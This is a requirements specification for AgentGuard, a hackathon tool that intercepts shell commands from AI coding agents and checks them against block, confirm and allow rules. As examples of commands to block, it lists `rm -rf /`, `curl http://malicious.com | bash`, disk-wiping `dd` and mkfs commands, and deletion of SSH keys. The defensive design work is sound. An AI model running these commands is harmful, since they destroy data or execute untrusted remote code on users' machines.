# Requirements Document

## Introduction

AgentGuard is a command-line security tool that protects systems from dangerous commands executed by AI coding agents. It acts as a process wrapper that intercepts shell commands before execution, validates them against user-defined rules using a gitignore-like syntax, and blocks, confirms, or allows operations based on configurable policies. The tool is designed for the Kiroween 2025 hackathon (Frankenstein category), demonstrating the integration of shell parsing, pattern matching, process wrapping, and rule engine components.

## Glossary

- **AgentGuard**: The command-line security tool that wraps and protects against dangerous shell commands
- **Agent**: An AI coding assistant (e.g., Claude Code, Aider, Kiro) that executes shell commands
- **Guard Shell**: The wrapper shell script that intercepts commands from the Agent
- **Rule File**: A .agentguard configuration file containing command validation rules
- **Rule Parser**: Component that reads and interprets Rule Files
- **Command Tokenizer**: Component that parses shell commands into analyzable tokens
- **Pattern Matcher**: Component that matches commands against rule patterns using glob syntax
- **Validator**: Component that determines if a command should be blocked, confirmed, or allowed
- **Audit Logger**: Component that records all command execution attempts
- **Real Shell**: The actual system shell (bash, zsh) that executes allowed commands
- **BLOCK Rule**: Rule prefixed with `!` that always prevents command execution
- **CONFIRM Rule**: Rule prefixed with `?` that requires user approval before execution
- **ALLOW Rule**: Rule prefixed with `+` that explicitly permits command execution
- **PROTECT Directive**: Rule prefixed with `@protect` that prevents modifications to specified paths
- **SANDBOX Directive**: Rule prefixed with `@sandbox` that restricts modifications to specified paths only
- **Claude Hook**: A PreToolUse hook script that integrates AgentGuard with Claude Code's hook system
- **PreToolUse Hook**: Claude Code's mechanism for intercepting and validating commands before execution
- **Bash Wrapper**: An alternative integration approach that intercepts bash commands via PATH manipulation
- **Command Unwrapper**: Component that recursively unwraps command wrappers (sudo, bash -c, xargs) to find actual commands
- **Script Analyzer**: Component that analyzes script file contents for dangerous patterns before execution
- **Catastrophic Path**: System-critical paths (/, ~, /home, /etc, etc.) that should always be protected from deletion
- **Inherently Dangerous Command**: Commands like mkfs, dd to block devices that can destroy data regardless of arguments
- **Passthrough Wrapper**: Commands like sudo, env, nice that execute another command unchanged
- **Dynamic Executor**: Commands like xargs that receive arguments from external sources (stdin)

## Requirements

### Requirement 1 [P0]

**User Story:** As a developer using AI coding agents, I want to wrap agent commands with AgentGuard protection, so that dangerous operations are prevented before they can harm my system.

#### Acceptance Criteria

1. WHEN a user executes `agentguard <command>`, THE AgentGuard SHALL spawn the specified command with a modified SHELL environment variable pointing to the Guard Shell
2. WHEN the Agent attempts to execute a shell command, THE Guard Shell SHALL intercept the command before it reaches the Real Shell
3. WHEN the Guard Shell receives a command, THE AgentGuard SHALL validate the command against loaded rules before execution
4. WHEN a command is allowed, THE AgentGuard SHALL execute it via the Real Shell and return the output to the Agent
5. WHEN a command is blocked, THE AgentGuard SHALL prevent execution and return an error to the Agent

### Requirement 2 [P0]

**User Story:** As a system administrator, I want to define command validation rules using intuitive syntax, so that I can configure protection policies without complex programming.

#### Acceptance Criteria

1. WHEN the Rule Parser reads a Rule File, THE AgentGuard SHALL parse rules with prefixes `!`, `?`, `+`, `@protect`, and `@sandbox`
2. WHEN the Rule Parser encounters a line starting with `#`, THE AgentGuard SHALL treat it as a comment and ignore it
3. WHEN the Rule Parser encounters a blank line, THE AgentGuard SHALL skip it without error
4. WHEN the Rule Parser encounters invalid syntax, THE AgentGuard SHALL report the error with line number and continue parsing remaining rules
5. WHEN multiple Rule Files exist at `/etc/agentguard/rules` (global), `~/.config/agentguard/rules` (user), and `./.agentguard` (project), THE AgentGuard SHALL merge rules with project rules taking precedence over user rules, and user rules taking precedence over global rules

### Requirement 3 [P0]

**User Story:** As a security-conscious user, I want catastrophic commands to be blocked automatically, so that AI agents cannot accidentally destroy my system.

#### Acceptance Criteria

1. WHEN a command matches a BLOCK Rule (prefixed with `!`), THE AgentGuard SHALL prevent execution without prompting the user
2. WHEN a blocked command is prevented, THE AgentGuard SHALL display a message indicating the command was blocked and which rule matched
3. WHEN a blocked command is prevented, THE AgentGuard SHALL return a non-zero exit code to the Agent
4. WHEN the command `rm -rf /` is attempted, THE AgentGuard SHALL block it using the default catastrophic rules
5. WHEN the command `rm -rf /*` is attempted, THE AgentGuard SHALL block it using the default catastrophic rules
6. WHEN a command targets any catastrophic path (/, ~, /home, /etc, /usr, /var, /bin, /sbin, /lib, /boot, /dev, /proc, /sys), THE AgentGuard SHALL block it regardless of rule configuration

### Requirement 4 [P1]

**User Story:** As a cautious developer, I want to review and approve dangerous commands before execution, so that I maintain control over risky operations.

#### Acceptance Criteria

1. WHEN a command matches a CONFIRM Rule (prefixed with `?`), THE AgentGuard SHALL display a confirmation prompt to the user
2. WHEN displaying a confirmation prompt, THE AgentGuard SHALL show the command, matched rule, and estimated scope of impact
3. WHEN the user responds with `y` or `Y` to a confirmation prompt, THE AgentGuard SHALL execute the command
4. WHEN the user responds with `n`, `N`, or any other input to a confirmation prompt, THE AgentGuard SHALL block the command
5. WHEN a confirmation prompt times out after 30 seconds without user input, THE AgentGuard SHALL default to blocking the command and display a timeout message

### Requirement 5 [P0]

**User Story:** As a developer performing routine tasks, I want safe commands to execute without interruption, so that my workflow remains efficient.

#### Acceptance Criteria

1. WHEN a command matches an ALLOW Rule (prefixed with `+`), THE AgentGuard SHALL execute it without prompting
2. WHEN the command `rm -rf node_modules` is attempted and matches an ALLOW Rule, THE AgentGuard SHALL execute it immediately
3. WHEN a command matches both an ALLOW Rule and a BLOCK Rule, THE AgentGuard SHALL apply the BLOCK Rule (deny takes precedence)
4. WHEN a command matches no rules, THE AgentGuard SHALL apply the default policy of allowing execution
5. WHEN an allowed command executes, THE AgentGuard SHALL display a message indicating the command was allowed and which rule matched

### Requirement 6 [P0]

**User Story:** As a developer, I want to parse complex shell commands accurately, so that validation works correctly regardless of command syntax.

#### Acceptance Criteria

1. WHEN the Command Tokenizer receives a command with quoted strings, THE AgentGuard SHALL preserve the quoted content as single tokens
2. WHEN the Command Tokenizer receives a command with environment variables (`$HOME`, `$USER`), THE AgentGuard SHALL expand them to their actual values
3. WHEN the Command Tokenizer receives a command with tilde (`~`), THE AgentGuard SHALL expand it to the user's home directory path
4. WHEN the Command Tokenizer receives a command with relative paths, THE AgentGuard SHALL resolve them to absolute paths
5. WHEN the Command Tokenizer receives a command with escape sequences, THE AgentGuard SHALL interpret them correctly

### Requirement 7 [P0]

**User Story:** As a security administrator, I want to match commands against patterns using wildcards, so that rules can cover multiple similar commands efficiently.

#### Acceptance Criteria

1. WHEN the Pattern Matcher evaluates a rule with `*` wildcard, THE AgentGuard SHALL match zero or more characters in that position
2. WHEN the Pattern Matcher evaluates a rule with `?` wildcard, THE AgentGuard SHALL match exactly one character in that position
3. WHEN the Pattern Matcher evaluates a rule pattern `rm -rf *`, THE AgentGuard SHALL match commands like `rm -rf anything`
4. WHEN the Pattern Matcher compares paths, THE AgentGuard SHALL normalize them before matching (resolve symlinks, remove trailing slashes)
5. WHEN the Pattern Matcher finds multiple matching rules, THE AgentGuard SHALL apply precedence in order: rule type (BLOCK > CONFIRM > ALLOW), then specificity (more specific patterns win), then source (project > user > global)

### Requirement 8 [P0]

**User Story:** As a system auditor, I want all command execution attempts logged, so that I can review agent behavior and security incidents.

#### Acceptance Criteria

1. WHEN any command is intercepted, THE Audit Logger SHALL record a log entry with timestamp, command, result, and matched rule
2. WHEN the Audit Logger writes entries, THE AgentGuard SHALL persist them to `~/.agentguard/audit.log`
3. WHEN the audit log file grows beyond 10MB, THE Audit Logger SHALL rotate it to a timestamped backup file
4. WHEN writing log entries, THE Audit Logger SHALL ensure each entry is on a single line for easy parsing
5. WHEN log writes fail, THE AgentGuard SHALL continue operation without blocking command execution

### Requirement 9 [P0]

**User Story:** As a developer, I want clear visual feedback about command validation, so that I understand why commands are blocked or allowed.

#### Acceptance Criteria

1. WHEN AgentGuard starts, THE AgentGuard SHALL display a banner showing version, protected command, loaded rules count, and mode
2. WHEN a command is blocked, THE AgentGuard SHALL display a message with 🚫 emoji, the command, matched rule, and reason
3. WHEN a command is allowed, THE AgentGuard SHALL display a message with ✅ emoji, the command, and matched rule
4. WHEN a confirmation is required, THE AgentGuard SHALL display a message with ⚠️ emoji, the command, matched rule, and scope information
5. WHEN displaying messages, THE AgentGuard SHALL preserve terminal colors and formatting from the wrapped command output

### Requirement 10 [P1]

**User Story:** As a new AgentGuard user, I want to initialize a project with sensible defaults, so that I can start with basic protection immediately.

#### Acceptance Criteria

1. WHEN a user executes `agentguard init`, THE AgentGuard SHALL create a .agentguard file in the current directory
2. WHEN creating a default Rule File, THE AgentGuard SHALL include rules blocking catastrophic commands (rm -rf /, mkfs, dd to /dev)
3. WHEN creating a default Rule File, THE AgentGuard SHALL include rules confirming dangerous commands (rm -rf *, git push --force)
4. WHEN creating a default Rule File, THE AgentGuard SHALL include rules allowing safe cleanup commands (rm -rf node_modules, rm -rf dist)
5. WHEN a .agentguard file already exists, THE AgentGuard SHALL prompt the user before overwriting

### Requirement 11 [P1]

**User Story:** As a developer testing rules, I want to check if a command would be allowed without executing it, so that I can validate my rule configuration safely.

#### Acceptance Criteria

1. WHEN a user executes `agentguard check "<command>"`, THE AgentGuard SHALL evaluate the command against loaded rules
2. WHEN evaluating a test command, THE AgentGuard SHALL display whether it would be blocked, confirmed, or allowed
3. WHEN evaluating a test command, THE AgentGuard SHALL show which rule would match
4. WHEN evaluating a test command, THE AgentGuard SHALL not execute the command or log it to the audit log
5. WHEN the test command would require confirmation, THE AgentGuard SHALL indicate this without prompting the user

### Requirement 12 [P2]

**User Story:** As a security administrator, I want to protect critical directories from modification, so that agents cannot alter sensitive configuration or credentials.

#### Acceptance Criteria

1. WHEN a Rule File contains `@protect <path>`, THE AgentGuard SHALL block any command that would modify files within that path
2. WHEN a command attempts to modify a file in a protected path, THE AgentGuard SHALL block it and display which PROTECT Directive matched
3. WHEN the command `rm ~/.ssh/id_rsa` is attempted and `@protect ~/.ssh` is defined, THE AgentGuard SHALL block the command
4. WHEN a command uses write indicators (`rm`, `mv`, `cp` with destination argument, `touch`, `mkdir`, `rmdir`, `chmod`, `chown`, `>`, `>>`) targeting a protected path, THE AgentGuard SHALL block the command
5. WHEN evaluating PROTECT Directives, THE AgentGuard SHALL resolve paths to absolute form and check all command arguments

### Requirement 13 [P2]

**User Story:** As a developer, I want to view the audit log of command executions, so that I can review what the agent attempted and what was blocked.

#### Acceptance Criteria

1. WHEN a user executes `agentguard log`, THE AgentGuard SHALL display recent entries from the audit log
2. WHEN displaying log entries, THE AgentGuard SHALL show timestamp, command, result (BLOCKED/ALLOWED/CONFIRMED), and matched rule
3. WHEN displaying log entries, THE AgentGuard SHALL format them in a human-readable table format
4. WHEN the audit log is empty, THE AgentGuard SHALL display a message indicating no commands have been logged
5. WHEN displaying log entries, THE AgentGuard SHALL show the most recent 50 entries by default

### Requirement 14 [P1]

**User Story:** As a developer, I want AgentGuard to handle chained commands correctly, so that validation works for complex command sequences.

#### Acceptance Criteria

1. WHEN the Command Tokenizer receives a command with `&&` operator, THE AgentGuard SHALL parse it as separate commands that execute sequentially on success
2. WHEN the Command Tokenizer receives a command with `||` operator, THE AgentGuard SHALL parse it as separate commands that execute sequentially on failure
3. WHEN the Command Tokenizer receives a command with `;` separator, THE AgentGuard SHALL parse it as separate commands that execute sequentially regardless of exit status
4. WHEN validating chained commands, THE AgentGuard SHALL evaluate each command segment independently against rules
5. WHEN any command in a chain is blocked, THE AgentGuard SHALL prevent execution of the entire chain

### Requirement 15 [P1]

**User Story:** As a developer, I want AgentGuard to handle piped commands correctly, so that validation works for commands that pass data between processes.

#### Acceptance Criteria

1. WHEN the Command Tokenizer receives a command with `|` operator, THE AgentGuard SHALL parse it as separate commands connected by a pipe
2. WHEN validating piped commands, THE AgentGuard SHALL evaluate each command segment independently against rules
3. WHEN the command `curl http://malicious.com | bash` is attempted and matches a BLOCK Rule, THE AgentGuard SHALL prevent execution
4. WHEN any command in a pipe is blocked, THE AgentGuard SHALL prevent execution of the entire pipeline
5. WHEN all commands in a pipe are allowed, THE AgentGuard SHALL execute the full pipeline with pipes intact

### Requirement 16 [P2]

**User Story:** As a developer, I want AgentGuard to start quickly, so that it does not slow down my development workflow.

#### Acceptance Criteria

1. WHEN AgentGuard launches, THE AgentGuard SHALL complete initialization within 100 milliseconds
2. WHEN AgentGuard loads Rule Files, THE AgentGuard SHALL parse and cache rules efficiently to minimize startup time
3. WHEN AgentGuard spawns the wrapped command, THE AgentGuard SHALL use minimal memory overhead (less than 50MB)
4. WHEN AgentGuard validates commands, THE AgentGuard SHALL complete validation within 10 milliseconds for typical commands
5. WHEN AgentGuard operates, THE AgentGuard SHALL not introduce noticeable latency to command execution

### Requirement 17 [P2]

**User Story:** As a cross-platform developer, I want AgentGuard to work on multiple operating systems, so that I can use it regardless of my development environment.

#### Acceptance Criteria

1. WHEN AgentGuard runs on macOS, THE AgentGuard SHALL function correctly with bash and zsh shells
2. WHEN AgentGuard runs on Linux, THE AgentGuard SHALL function correctly with bash and zsh shells
3. WHEN AgentGuard runs on Windows WSL, THE AgentGuard SHALL function correctly with bash shell
4. WHEN AgentGuard resolves paths, THE AgentGuard SHALL use platform-appropriate path separators and conventions
5. WHEN AgentGuard spawns processes, THE AgentGuard SHALL use platform-appropriate process management APIs

### Requirement 18 [P2]

**User Story:** As a security administrator, I want to restrict agent modifications to specific directories, so that agents can only write within designated sandbox areas.

#### Acceptance Criteria

1. WHEN a Rule File contains `@sandbox <path>`, THE AgentGuard SHALL allow write operations only within the specified path
2. WHEN a command attempts to write outside all defined sandbox paths, THE AgentGuard SHALL block it and display which SANDBOX Directive was violated
3. WHEN multiple SANDBOX Directives are defined, THE AgentGuard SHALL allow writes to any of the specified sandbox paths
4. WHEN a command uses write indicators (`rm`, `mv`, `cp` with destination argument, `touch`, `mkdir`, `rmdir`, `chmod`, `chown`, `>`, `>>`) targeting a path outside the sandbox, THE AgentGuard SHALL block the command
5. WHEN no SANDBOX Directives are defined, THE AgentGuard SHALL allow writes to any location (sandbox mode is opt-in)

### Requirement 24 [P0]

**User Story:** As a security-conscious user, I want inherently dangerous commands blocked automatically, so that commands that can destroy disk data are prevented regardless of arguments.

#### Acceptance Criteria

1. WHEN a command is `mkfs`, `mkfs.ext2`, `mkfs.ext3`, `mkfs.ext4`, `mkfs.xfs`, `mkfs.btrfs`, `mkfs.vfat`, `mke2fs`, `mkswap`, `fdisk`, `parted`, `gdisk`, `cfdisk`, or `sfdisk`, THE AgentGuard SHALL block it as inherently dangerous
2. WHEN a `dd` command writes to a block device (of=/dev/sda, /dev/nvme*, /dev/vd*, /dev/xvd*, /dev/mmcblk*), THE AgentGuard SHALL block it as inherently dangerous
3. WHEN an inherently dangerous command is blocked, THE AgentGuard SHALL display a message indicating the command is a dangerous system command that can destroy data
4. WHEN an inherently dangerous command is wrapped (e.g., `sudo mkfs.ext4`), THE AgentGuard SHALL unwrap and still block it
5. WHEN checking inherently dangerous commands, THE AgentGuard SHALL perform this check before pattern rule matching

### Requirement 25 [P0]

**User Story:** As a security-conscious user, I want script content analyzed before execution, so that dangerous scripts cannot harm my system even if the script file looks innocuous.

#### Acceptance Criteria

1. WHEN a command executes a script file (e.g., `python script.py`, `bash script.sh`, `node script.js`), THE AgentGuard SHALL analyze the script content for dangerous patterns
2. WHEN a script contains dangerous operations (shutil.rmtree, fs.rmSync, rm -rf) targeting catastrophic paths, THE AgentGuard SHALL block the script execution
3. WHEN a script cannot be read (file missing, binary file, too large), THE AgentGuard SHALL fail-open and allow the command
4. WHEN detecting script execution, THE AgentGuard SHALL recognize Python (.py), Node.js (.js, .mjs, .cjs), Shell (.sh, .bash), Ruby (.rb), and Perl (.pl) scripts
5. WHEN script analysis detects threats, THE AgentGuard SHALL report the specific dangerous patterns found

### Requirement 26 [P0]

**User Story:** As a security-conscious user, I want commands unwrapped recursively, so that dangerous commands hidden behind wrappers like sudo, bash -c, or xargs are still detected and blocked.

#### Acceptance Criteria

1. WHEN a command uses passthrough wrappers (sudo, doas, env, nice, nohup, timeout, time, watch, strace, ltrace, ionice, chroot, runuser), THE AgentGuard SHALL unwrap to find the actual command being executed
2. WHEN a command uses shell -c wrappers (bash -c, sh -c, zsh -c), THE AgentGuard SHALL parse and unwrap the shell command string
3. WHEN a command uses dynamic executors (xargs, parallel), THE AgentGuard SHALL detect and flag that arguments are dynamic
4. WHEN a command uses find -exec, -execdir, -ok, -okdir, or -delete, THE AgentGuard SHALL extract and validate the executed command
5. WHEN wrappers are nested (e.g., `sudo bash -c "rm -rf /"`), THE AgentGuard SHALL recursively unwrap all layers

### Requirement 19 [P0]

**User Story:** As a developer, I want AgentGuard to run on modern Node.js versions, so that I can use it with current JavaScript tooling and dependencies.

#### Acceptance Criteria

1. WHEN AgentGuard is installed, THE AgentGuard SHALL require Node.js version 18 or higher
2. WHEN AgentGuard starts with an incompatible Node.js version, THE AgentGuard SHALL display an error message indicating the minimum required version
3. WHEN AgentGuard uses Node.js APIs, THE AgentGuard SHALL only use APIs available in Node.js 18 and later
4. WHEN AgentGuard is packaged, THE AgentGuard SHALL specify the Node.js version requirement in package.json engines field
5. WHEN AgentGuard documentation is provided, THE AgentGuard SHALL clearly state the Node.js 18+ requirement

### Requirement 20 [P1]

**User Story:** As a Claude Code user, I want to install AgentGuard as a PreToolUse hook, so that all Bash commands are automatically validated without needing to wrap the entire process.

#### Acceptance Criteria

1. WHEN a user executes `agentguard install claude`, THE AgentGuard SHALL create or update the Claude Code settings.json file with a PreToolUse hook configuration
2. WHEN installing for a project, THE AgentGuard SHALL write the hook configuration to `.claude/settings.json` in the current directory
3. WHEN installing globally with `--global` flag, THE AgentGuard SHALL write the hook configuration to `~/.claude/settings.json`
4. WHEN the hook configuration is written, THE AgentGuard SHALL configure it to intercept Bash tool uses and call the claude-hook script
5. WHEN installation completes, THE AgentGuard SHALL display a success message with the settings file location and next steps

### Requirement 21 [P1]

**User Story:** As a Claude Code user, I want to uninstall the AgentGuard hook, so that I can disable protection when needed.

#### Acceptance Criteria

1. WHEN a user executes `agentguard uninstall claude`, THE AgentGuard SHALL remove the hooks configuration from the Claude Code settings.json file
2. WHEN uninstalling from a project, THE AgentGuard SHALL modify `.claude/settings.json` in the current directory
3. WHEN uninstalling globally with `--global` flag, THE AgentGuard SHALL modify `~/.claude/settings.json`
4. WHEN the settings file does not exist, THE AgentGuard SHALL display a message indicating nothing to uninstall
5. WHEN uninstallation completes, THE AgentGuard SHALL display a success message reminding the user to restart Claude Code

### Requirement 22 [P1]

**User Story:** As a Claude Code user, I want AgentGuard to validate Bash commands through the PreToolUse hook, so that dangerous commands are blocked before Claude executes them.

#### Acceptance Criteria

1. WHEN Claude Code attempts to execute a Bash command, THE claude-hook script SHALL receive the command via stdin as JSON
2. WHEN the claude-hook receives a command, THE AgentGuard SHALL validate it against loaded rules
3. WHEN a command is blocked by the hook, THE claude-hook SHALL exit with code 2 and display a block message to stderr
4. WHEN a command requires confirmation in hook context, THE claude-hook SHALL block it and display a message indicating manual confirmation is required
5. WHEN a command is allowed by the hook, THE claude-hook SHALL exit with code 0 to permit execution

### Requirement 23 [P1]

**User Story:** As a Kiro CLI user, I want instructions for using AgentGuard with Kiro, so that I can protect Kiro commands even though Kiro doesn't have a hook system.

#### Acceptance Criteria

1. WHEN a user executes `agentguard install kiro`, THE AgentGuard SHALL display usage instructions for the wrapper approach
2. WHEN displaying Kiro instructions, THE AgentGuard SHALL explain that Kiro uses the wrapper approach via `agentguard -- kiro <command>`
3. WHEN displaying Kiro instructions, THE AgentGuard SHALL provide examples of wrapping common Kiro commands
4. WHEN displaying Kiro instructions, THE AgentGuard SHALL suggest creating an alias for convenience
5. WHEN a user executes `agentguard uninstall kiro`, THE AgentGuard SHALL display a message explaining that Kiro uses the wrapper approach and no installation is needed

## Scope Reduction Options

This section defines progressive scope reductions for time-constrained development scenarios. Each level removes features while maintaining a functional demo.

### Level 1: Full Feature Set (33+ hours)
All requirements P0, P1, and P2 implemented as specified.

### Level 2: Core + Polish (26 hours)
Remove: P2 requirements (12, 13, 16, 17, 18)
Keep: All P0 and P1 requirements
Impact: No @protect/@sandbox directives, no log viewing, no performance guarantees, no cross-platform testing

### Level 3: Core + Confirmation (22 hours)
Remove: P1 requirements (4, 10, 11, 14, 15) and all P2
Keep: P0 requirements only
Impact: No confirmation prompts, no init/check commands, no chained/piped command support

### Level 4: Minimal Viable Demo (19 hours)
Remove: Requirements 4, 6 (complex parsing), 10-18
Keep: Requirements 1, 2, 3, 5, 7, 8, 9, 19
Simplify: Command tokenizer handles only simple space-separated commands with basic quotes
Impact: Demo works for simple commands only, no complex shell syntax support

### Level 5: Proof of Concept (12 hours)
Remove: Requirements 4, 6, 8, 10-18
Keep: Requirements 1, 2, 3, 5, 7, 9, 19
Simplify: No audit logging, minimal visual feedback
Impact: Core blocking/allowing works, but no audit trail or detailed feedback

### Minimum Viable Demo Scope
For a compelling 2-minute demo, implement Level 4 (Minimal Viable Demo) with these specific capabilities:
- Wrap Claude Code with `agentguard claude`
- Block `rm -rf /` with visual feedback
- Allow `rm -rf node_modules` with visual feedback
- Parse simple commands with quotes and environment variables
- Load rules from .agentguard file
- Display startup banner
- Log to audit file

## Out of Scope

The following features are explicitly excluded from all implementation levels:

1. **Windows Native Support**: Only Windows WSL is supported; native Windows cmd.exe and PowerShell are not supported
2. **GUI Interface**: AgentGuard is command-line only; no graphical configuration or monitoring interface
3. **Network Request Interception**: AgentGuard does not intercept or validate network requests made by commands
4. **Inline Code Detection**: AgentGuard does not parse code passed via `-c` or `-e` flags (e.g., `python -c "dangerous code"`) - only script files are analyzed
5. **Real-Time Rule File Watching**: Rule files are loaded at startup; changes require restarting AgentGuard
6. **Subshell Parsing**: Commands using `$()` or backticks are not parsed recursively
7. **Background Process Management**: Commands with `&` are not specially handled beyond basic tokenization
8. **Interactive Command Support**: Commands requiring interactive input (vim, less, top) may not work correctly through the wrapper
9. **ANSI Escape Code Filtering**: AgentGuard passes through terminal formatting but does not validate or sanitize escape codes
10. **Machine Learning Rule Suggestions**: No AI-based rule recommendation system
11. **Binary File Inspection**: AgentGuard cannot analyze compiled executables or binary files
12. **Full Sandboxing**: AgentGuard is not a complete sandbox - use Docker/containers for true isolation
